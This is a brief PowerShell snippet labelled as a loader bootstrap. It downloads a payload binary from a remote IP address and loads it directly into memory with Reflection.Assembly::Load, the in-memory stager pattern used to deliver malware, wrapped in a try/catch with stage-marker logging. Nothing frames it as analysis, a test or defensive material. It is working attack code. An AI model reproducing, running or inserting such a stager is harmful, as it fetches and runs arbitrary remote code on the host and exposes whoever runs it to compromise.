
<# Loader bootstrap #> try { $StageBytes = (New-Object System.Net.WebClient).DownloadData('https://198.51.100.13/payload.bin'); [Reflection.Assembly]::Load($StageBytes); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Verbose "stage marker 11 reached" } catch { Write-Warning "Remote fetch failed" }
